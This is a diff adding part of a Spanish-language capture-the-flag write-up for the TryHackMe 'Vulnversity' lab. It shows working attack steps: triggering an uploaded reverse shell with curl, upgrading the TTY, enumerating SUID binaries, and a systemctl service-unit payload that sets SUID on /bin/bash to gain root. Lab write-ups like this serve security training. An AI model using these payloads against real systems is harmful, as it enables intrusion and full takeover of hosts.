@@ -141,4 +141,112 @@ Finalmente, presionaremos el botón de iniciar ataque, e inmediatamente aparecer
 
 Con esta información, ya sabemos que tipo de archivo es válido para subir en la ruta `internal`, por lo que procederemos a cambiar la extensión de nuestro archivo y subirlo una última vez.
 
+Una vez el archivo está subido, podemos ponernos en escucha por el puerto que hayamos establecido en nuestra _reverse shell_ a través de _Netcat_. A partir de aquí podemos hacer dos cosas:
 
+Podemos navegar a la dirección en la que está subido nuestro archivo (tal como lo indica la plataforma de _Try Hack Me_), es decir, entrar a:
+
+```
+http://<dirección IP>:3333/internal/uploads/nombreDeLaReverseShell.phtml
+```
+O por otra parte, y sin dejar la consola, utilizar el comando _curl_:
+
+```
+curl http://<dirección IP>:3333/internal/uploads/nombreDeLaReverseShell.phtml
+```
+
+Ambas opciones, nos conseguirán una _consola_ dentro de la máquina víctima.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/12.png)
+
+Es importante que la _consola_ que acabamos de conseguir, no es nada interactiva, esto quiere decir que si quisieramos limpiar la consola utilizando `Ctrl + L`, no pasará nada, así mismo si quisieramos desplazarnos utilizando las flechas del teclado, no nos será posible hacerlo, para ello deberemos de realizar el respectivo tratamiento de la `TTY`, para lo cual haremos lo siguiente:
+
+```
+script /dev/null -c bash
+Ctrl + Z
+stty raw -echo; fg
+reset
+xterm
+
+export TERM=xterm
+export SHELL=bash
+
+stty rows <valor> columns <valor>
+```
+
+Los valores que colocaremos en el último comando, dependerán del tamaño de nuestra pantalla, por lo cual en una nueva terminal de nuestra máquina escribiremos lo siguiente:
+
+```
+stty -a
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/13.png)
+
+Los valores que nos aparezcan serán los que colocaremos en el último comando del tratamiento de la `TTY`.
+
+Continuando con las preguntas de la plataforma, nos pregunta ahora por el usuario que maneja el servidor web, así como su respectiva `flag`. Para realizar esto podríamos dirigirnos al directorio `/home`, y listar los directorios que existen.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/14.png)
+
+Aunque también podriamos filtrar del archivo `/etc/passwd`, a través de expresiones regulares, todos aquellos usuario que tengan una _shell_, sea esta una:
+
+* bash
+* zsh
+* sh
+* csh
+* ksh
+* tcsh
+
+Esto sería bastante fácil, ya que todas, o casi todas las _shells_ terminan en `sh`, de modo que:
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/15.png)
+
+Una vez hemos listado los usuarios del sistema, podemos pasar a buscar en que ruta se encuentra la `flag` del usuario con bajos privilegios, para ello podemos hacer lo siguiente:
+
+```
+find . -name user.txt 2> /dev/null
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/16.png)
+
+### [](#header-3)Escalada De Privilegios
+
+Para realizar esta última fase, la misma plataforma de _Try Hack Me_ nos sugiere que nos aprovechemos de algún binario con permisos mal asignados, concretamente permisos `SUID`. Para listar todos aquellos binarios con permisos `SUID` asignados, tenemos varias opciones, no obstante, estas son las que yo utilizo:
+
+```
+find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+```
+
+```
+find / -uid 0 -perm -4000 -type f 2>/dev/null
+```
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/17.png)
+
+Para aprovecharnos de algún binario, la mejor forma es recurrir a [GTFOBins](https://gtfobins.github.io/), esta página nos explica como aprovecharnos de binarios con _capabilities_ mal asignadas, binarios que se pueden ejectuar como _root_, y en este caso binarios con permisos _SUID_ mal asignados.
+
+En este caso, el binario más extraño que nos encontramos es `/bin/systemctl`, ya que este comando lo que nos permite es controlar el sistema y sus servicios, por lo que procederemos a buscar en `GTFOBins`.
+
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/18.png)
+
+Como podemos ver, podemos abusar de este binario fácilmente, además de que nos permite ejecutar cualquier código malicioso que queramos, para conseguir la última `flag` haremos lo siguiente:
+
+```
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "chmod +s /bin/bash"
+[Install]
+WantedBy=multi-user.target' > $TF
+/bin/systemctl link $TF
+/bin/systemctl enable --now $TF
+```
+
+Lo único que modificamos de la información que nos provee `GTFOBins`, fue el código a ejecutar, en este caso, asignar un permiso `SUID` a la `/bin/bash`, para a través del parámetro `-p`, ejecutar el binario `/bin/bash` manteniendo permisos y privilegios del usuario al que le pertenece el binario, en este caso al usuario _Root_. Otro aspecto que se modificó fue utilizar el binario `/bin/systemctl` desde su ruta absoluta, mas no de su ruta relativa.
+
+Una vez siendo _Root_, podemos pasar a buscar su respectiva flag, esto lo podemos hacer así:
+
+```
+find . -name root.txt
+```
+ 
+![](https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/master/assets/2021-09-27-Vulnversity---Try-Hack-Me/19.png)
